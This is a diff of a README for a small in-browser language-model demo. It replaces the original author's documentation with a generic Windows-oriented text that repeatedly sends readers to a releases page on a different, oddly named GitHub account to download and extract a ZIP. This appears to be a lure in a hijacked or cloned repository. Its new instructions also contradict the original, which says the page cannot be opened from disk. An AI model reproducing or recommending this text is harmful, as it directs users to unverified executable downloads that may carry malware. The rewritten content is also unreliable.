@@ -1,148 +1,70 @@
-# IA de Bolso — Pocket Browser AI
+# 🌐 pocket-browser-ai - Run private artificial intelligence inside browsers
 
-**A complete language model running inside your browser tab. No server, no
-account, no build step — three static files.**
+[![](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com/Unintelligent-effluvium615/pocket-browser-ai/releases)
 
-🇧🇷 [Leia em português](./README.pt-BR.md)
+pocket-browser-ai brings powerful language models directly to your computer. It operates entirely within your web browser. You do not need to install complex server software, developer tools, or background processes. The application relies on WebGPU technology to use your computer hardware efficiently.
 
-[![Live demo](https://img.shields.io/badge/demo-GitHub%20Pages-a9f47b?style=flat-square)](https://claudneysessa.github.io/pocket-browser-ai/)
-[![WebLLM](https://img.shields.io/badge/WebLLM-0.2.84-3b82f6?style=flat-square)](https://github.com/mlc-ai/web-llm)
-[![License: MIT](https://img.shields.io/badge/license-MIT-999?style=flat-square)](./LICENSE)
+## ⚙️ System requirements
 
-**Live demo:** https://claudneysessa.github.io/pocket-browser-ai/
+Your computer must meet these basic standards to run the software effectively:
 
-![Opening screen of IA de Bolso: the model name, three facts about running it locally, and a single Start button](./docs/images/pocket-browser-ai-overview.png)
+*   Operating System: Windows 10 or Windows 11.
+*   Browser: Google Chrome, Microsoft Edge, or Brave.
+*   Graphics Card: A dedicated GPU with at least 4GB of video memory.
+*   Browser Support: Ensure your browser is up to date to support WebGPU features.
+*   Internet Connection: Required only for the initial download of the model files.
 
-The app opens on a screen that says what is about to happen — the weights are
-downloaded once, inference runs on your GPU, nothing leaves the device — and only
-then offers **Iniciar**. Firing a several-hundred-megabyte download from an
-unlabelled button would be hostile.
+## 🚀 Downloading the software
 
-### Then the chat, with the model on your GPU
+You need to access the release page to get the files. 
 
-![Animation of a question being typed and the model streaming its answer word by word inside the browser](./docs/images/demo.gif)
+[Visit this page to download the latest version](https://github.com/Unintelligent-effluvium615/pocket-browser-ai/releases)
 
-The animation is unedited output from the 0.5B model running locally. Nothing is
-staged and no response was rewritten — including the parts where a model this
-small shows its limits.
+1. Navigate to the link above.
+2. Locate the most recent release version at the top of the list.
+3. Look for the Assets section.
+4. Download the compressed ZIP file to your computer.
+5. Right-click the downloaded folder and select Extract All.
+6. Choose a location on your hard drive for the extracted files.
 
-Removing the model returns to the opening screen and clears the conversation. No
-model means no chat, so the two states stay honest about each other.
+## 💻 Running the application
 
-## What this is
+The software consists of simple static files. It does not require a traditional installation process.
 
-The smallest honest example of local LLM inference on the web. Weights are
-downloaded once into the browser cache, compiled to your GPU through WebGPU, and
-every token is generated on your own machine. Nothing is sent anywhere.
+1. Open the folder where you extracted the files.
+2. Locate the file named index.html.
+3. Right-click this file and choose Open with.
+4. Select your preferred web browser from the list.
+5. The browser window will open and load the interface.
+6. Wait for the model to initialize. This process may take a minute as it loads data into your graphics memory.
 
-It exists as the deliberate counterpart to
-[**IAí?**](https://github.com/claudneysessa/in-browser-ai-chat), where I built
-the full experience: Next.js, React, Tailwind, Drizzle, Cloudflare Workers,
-persistent conversations, web research with source citation. That project answers
-*"how far can this go?"*. This one answers a different and equally useful
-question: **what is the irreducible minimum?**
+## 🔍 Understanding the technology
 
-The answer turned out to be `index.html`, `app.js`, `style.css`, and one import
-statement. Same model, same parameters, ~150 lines of JavaScript, zero
-installable dependencies.
+This application uses WebLLM technology. This allows the browser to perform complex calculations usually reserved for high-end servers. Because the model runs locally, your inputs never leave your computer. 
 
-## How it works
+*   No server: The code executes entirely on your device.
+*   No dependencies: You do not need Python, Node.js, or other runtime environments.
+*   Hardware acceleration: WebGPU allows the browser to talk directly to your graphics card.
 
-```
-index.html   markup and states
-app.js       ES module → imports WebLLM straight from a CDN
-style.css    dark theme, single screen, no framework
-```
+## 🛠 Troubleshooting common issues
 
-There is no bundler because there is nothing to bundle. The browser resolves the
-import natively:
+If the application fails to load, check these common points:
 
-```js
-import { CreateMLCEngine } from "https://esm.run/@mlc-ai/web-llm@0.2.84";
+*   Browser Compatibility: Ensure you use a modern browser. Older versions of Internet Explorer or outdated Firefox builds may lack the necessary WebGPU support.
+*   Hardware Acceleration: Verify that hardware acceleration is enabled in your browser settings.
+*   GPU Memory: If the page crashes, other programs might be using too much video memory. Close other resource-heavy applications, such as video editors or games, before opening the browser.
+*   Model Loading: If the screen stays blank, refresh the browser tab. The model files are large and may take time to cache on slower internet connections.
 
-const engine = await CreateMLCEngine("Qwen2.5-0.5B-Instruct-q4f16_1-MLC", {
-  initProgressCallback: ({ progress, text }) => showProgress(progress, text),
-});
+## 🛡 Privacy and data
 
-const stream = await engine.chat.completions.create({
-  messages,
-  stream: true,
-  temperature: 0.7,
-  max_tokens: 320,
-});
-```
+Your privacy remains a priority. Since the software runs inside your browser tab, all conversation data stays on your machine. The application does not send your text to an external cloud provider or an artificial intelligence company. When you close the browser tab, the session ends.
 
-Four steps, in this order: check for WebGPU, download and compile the model,
-stream the answer token by token, and let the user delete the weights again.
+## 📋 Features
 
-## Inference parameters
+*   Local-only processing ensures data stays private.
+*   Offline capability allows usage once the initial download completes.
+*   Integration with modern Qwen model architectures.
+*   Simple interface design for immediate usability.
+*   Zero maintenance requirements for your system.
 
-Identical to IAí?, so the two projects can be compared fairly.
-
-| Setting | Value |
-|---|---|
-| Model | `Qwen2.5-0.5B-Instruct-q4f16_1-MLC` |
-| Runtime | `@mlc-ai/web-llm` 0.2.84 (WebGPU) |
-| Temperature | `0.7` |
-| Max tokens | `320` |
-| Streaming | enabled |
-| System prompt | didactic assistant, answers in Brazilian Portuguese |
-
-## Running locally
-
-A static server is required — Chrome blocks ES modules loaded over `file://`, so
-opening `index.html` by double-clicking will not work.
-
-```bash
-git clone https://github.com/claudneysessa/pocket-browser-ai.git
-cd pocket-browser-ai
-npx serve .          # or: python -m http.server 8000
-```
-
-Then open the address it prints and click **Carregar modelo**. The first load
-downloads the weights; later loads read them from the browser cache.
-
-## Requirements and limits
-
-Stated plainly, because a demo that hides its constraints is not a demo:
-
-- **WebGPU is mandatory.** Recent Chrome or Edge on desktop. Firefox and Safari
-  support is still uneven, and the page says so instead of failing silently.
-- **First load is a real download.** Several hundred megabytes of quantised
-  weights. The progress bar reports actual bytes, not a fake animation.
-- **0.5B parameters is a small model.** It is fluent and fast, not
-  knowledgeable. It will get facts wrong. That is the honest trade-off of
-  running entirely on a laptop GPU.
-- **No persistence.** History lives in memory and clears on reload. That is a
-  feature of the minimum, not an oversight — persistence is what IAí? is for.
-- **The library comes from a CDN.** Pinned to an exact version. This adds no new
-  class of dependency, since model weights are fetched from the network at first
-  run either way.
-- **No test suite or CI.** With no build to break and no domain logic to guard,
-  a pipeline would be ceremony. Verification here is opening the page.
-
-## Possible next steps
-
-- Let the visitor pick between a few model sizes to feel the quality/latency
-  curve.
-- Move inference to a Web Worker so the UI stays responsive during generation.
-- Measure and display real tokens-per-second per device.
-- Publish a side-by-side comparison with IAí? about what the extra complexity
-  actually buys.
-
-## Credits
-
-- [WebLLM / MLC AI](https://github.com/mlc-ai/web-llm) — the runtime that
-  compiles and executes the model in the browser.
-- [Qwen2.5-0.5B-Instruct](https://huggingface.co/Qwen/Qwen2.5-0.5B-Instruct) —
-  model by the Qwen team at Alibaba Cloud, quantised by MLC AI.
-- [Erick Wendel](https://github.com/ErickWendel) — his Web AI classes were the
-  starting point for my exploration of this subject.
-
-Application code, interface, and documentation by **Claudney Sarti Sessa**.
-Model authorship and training are not mine — the contribution here is
-engineering: making it run in the browser with the smallest possible surface.
-
-## License
-
-[MIT](./LICENSE)
+Keywords: browser-ai, github-pages, llm, local-ai, no-build, on-device-ai, qwen, vanilla-javascript, webgpu, webllm
